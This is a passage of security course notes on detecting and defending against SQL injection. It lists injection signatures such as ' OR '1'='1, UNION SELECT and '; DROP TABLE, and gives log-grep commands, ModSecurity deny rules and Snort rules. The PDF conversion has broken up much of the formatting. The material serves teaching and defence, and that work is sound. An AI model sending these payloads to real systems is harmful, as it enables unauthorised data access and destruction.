> #### 🔹 if !filter_var($email, FILTER_VALIDATE_EMAIL 
> 
> 
> 
> #### 🔹 die("Invalid email");
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 Disable Verbose Errors
> 
> 
> 
> #### 🔹 Production Settings:
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 41 to 45 Syllabus Content**
>
> ### 📍 Page 41
>
> 
> #### 🔹 Disable detailed error messages
> 
> 
> 
> #### 🔹 Log errors server-side only
> 
> 
> 
> #### 🔹 Generic user-facing errors
> 
> 
> 
> #### 🔹 No stack traces exposed
> 
> 
> 
> #### 🔹 6.3 Detecting SQL Injection Attacks
> 
> 
> 
> #### 🔹 Detection Indicators:
> 
> 
> 
> #### 🔹 Strange Input Patterns
> 
> 
> 
> #### 🔹 SQL Injection Signatures:
> 
> 
> 
> #### 🔹 ' OR '1'='1
> 
> 
> 
> #### 🔹 ' OR 11 
> 
> 
> 
> #### 🔹 ' UNION SELECT
> 
> 
> 
> #### 🔹 '; DROP TABLE
> 
> 
> 
> #### 🔹 admin' --
> 
> 
> 
> #### 🔹 ' AND SLEEP5 
> 
> 
> 
> #### 🔹 Repeated Errors
> 
> 
> 
> #### 🔹 Multiple failed queries
> 
> 
> 
> #### 🔹 Syntax errors
> 
> 
> 
> #### 🔹 Permission errors
> 
> 
> 
> #### 🔹 Suspicious error patterns
> 
> 
> 
> #### 🔹 Unusual Delays
> 
> 
> 
> #### 🔹 Unexpected slow responses
> 
> 
> 
> #### 🔹 Time-based blind SQLi
> 
> 
> 
> #### 🔹 Resource exhaustion
> 
> 
> 
> #### 🔹 Heavy queries
> 
> 
> 
> #### 🔹 Abnormal Input
> 
> 
> 
> #### 🔹 Special characters: ' " ; -- # /* */
> 
> 
> 
> #### 🔹 4 1
> 
>
> ---
>
> ### 📍 Page 42
>
> 
> #### 🔹 SQL keywords: SELECT, UNION, WHERE
> 
> 
> 
> #### 🔹 Encoded payloads
> 
> 
> 
> #### 🔹 Excessively long inputs
> 
> 
> 
> #### 🔹 Monitoring:
> 
> 
> 
> #### 🔹 # Log analysis
> 
> 
> 
> #### 🔹 grep "SQL syntax" /var/log/apache2/error.log
> 
> 
> 
> #### 🔹 grep "UNION SELECT" /var/log/nginx/access.log
> 
> 
> 
> #### 🔹 # Real-time monitoring
> 
> 
> tail -f /var/log/application.log | grep E "('||;|UNION|SELECT"
> 
> 
> #### 🔹 6.4 SQL Injection Detection Tools
> 
> 
> 
> #### 🔹 Security Tools:
> 
> 
> 
> #### 🔹 ModSecurity (WAF)
> 
> 
> 
> #### 🔹 SQL Injection Rules:
> 
> 
> SecRule ARGS "@detectSQLi" "id:1,deny,status:403,msg:'SQL Injection Det
> 
> 
> #### 🔹 ected'"
> 
> 
> SecRule ARGS "@rx (union|select|insert|update|delete)" "id:2,deny"
> 
> 
> #### 🔹 Snort/Suricata Rules
> 
> 
> alert tcp any any → any 80 (msg:"SQL Injection Attempt"; content:"' OR 1
> 
> 
> #### 🔹 1"; sid:1000001;)
> 
> 
> alert tcp any any → any 80 (msg:"SQL Injection UNION"; content:"UNION S
> 
> 
> #### 🔹 ELECT"; sid:1000002;)
> 
> 
> 
> #### 🔹 SQLMap Tamper Detection
> 
> 
> 
> #### 🔹 Detect SQLMap:
> 
> 
> 
> #### 🔹 Unusual User-Agent
> 
> 
> 
> #### 🔹 Rapid requests
> 
>
> ---
>
> ### 📍 Page 43
>
> 
> #### 🔹 Parameter fuzzing patterns
> 
> 
> 
> #### 🔹 Specific SQLMap signatures
> 
> 
> 
> #### 🔹 AppScan
> 
> 
> 
> #### 🔹 IBM Security AppScan
> 
> 
> 
> #### 🔹 Automated vulnerability scanning
> 
> 
> 
> #### 🔹 SQL injection detection
> 
> 
> 
> #### 🔹 Comprehensive testing
> 
> 
> 
> #### 🔹 Burp Suite Active Scanner
> 
> 
> 
> #### 🔹 Scanner  New Scan  SQL Injection
> 
> 
> 
> #### 🔹 Scanner  Issue Activity  SQL Injection
> 
> 
> 
> #### 🔹 Additional Detection Tools:
> 
> 
> 
> #### 🔹 OWASP ZAP  Open-source scanner
> 
> 
> 
> #### 🔹 Acunetix  Commercial scanner
> 
> 
> 
> #### 🔹 Nessus  Vulnerability scanner
> 
> 
> 
> #### 🔹 Nikto  Web server scanner
> 
> 
> 
> #### 🔹 W3AF  Web application attack framework
> 
>
> ---
>
> ### 📍 Page 44
>
> 
> #### 🔹 ✅Module Summary
> 
> 
> 
> #### 🔹 This module covered comprehensive SQL injection concepts,
> 
> 
> 
> #### 🔹 techniques, and defenses:
> 
> 
> 
> #### 🔹 Key Takeaways:
> 
> 
> SQL Injection Fundamentals  Manipulating SQL queries via user
> 
> 
> #### 🔹 input to bypass authentication, extract data, or execute
> 
> 
> 
> #### 🔹 commands
> 
> 
> Injection Types  In-band (error-based, UNION, blind (boolean-
> 
> 
> #### 🔹 based, time-based), out-of-band DNS, HTTP
> 
> 
> 
> #### 🔹 Attack Methodology  Information gathering, vulnerability
> 
> 
> 
> #### 🔹 detection, exploitation, enumeration, privilege escalation
> 
> 
> Advanced Techniques  Stored procedures, file system access,
> 
> 
> #### 🔹 OS command execution, network reconnaissance, backdoor
> 
> 
> 
> #### 🔹 creation
> 
> 
> 
> #### 🔹 Database-Specific Attacks  MySQL, MSSQL, Oracle,
> 
> 
> 
> #### 🔹 PostgreSQL with unique exploitation methods
> 
> 
> NoSQL Injection  MongoDB operator injection, authentication
> 
> 
> #### 🔹 bypass, JavaScript execution
> 
> 
> 
> #### 🔹 Evasion Techniques  Inline comments, encoding URL, hex,
> 
> 
> unicode), case variation, whitespace manipulation, obfuscation
> 
> 
> #### 🔹 Automated Tools  SQLmap, Havij, jSQL, Burp Suite, BBQSQL,
> 
> 
> 
> #### 🔹 NoSQLMap, Nmap NSE scripts
> 
> 
> Primary Defense  Parameterized queries (prepared statements)
> 
> 
> #### 🔹 treating input as data, never as code
> 
> 
> Additional Defenses  Input validation, ORM frameworks, stored
> 
> 
> #### 🔹 procedures, allowlisting, error handling, WAF deployment
> 
> 
> SQL injection remains one of the most critical web application vulnerabilities, consistently ranking in OWASP Top 10. Effective protection requires parameterized queries as the foundation, combined with input validation, least privilege database permissions, error handling, and defense-in-depth strategies including WAF deployment and continuous monitoring. Organizations must enforce secure coding practices, conduct regular code reviews, and perform
>
> ---
>
> ### 📍 Page 45
>
> 
> #### 🔹 penetration testing to identify and remediate SQL injection
> 
> 
> vulnerabilities before exploitation.
>
> ---
>
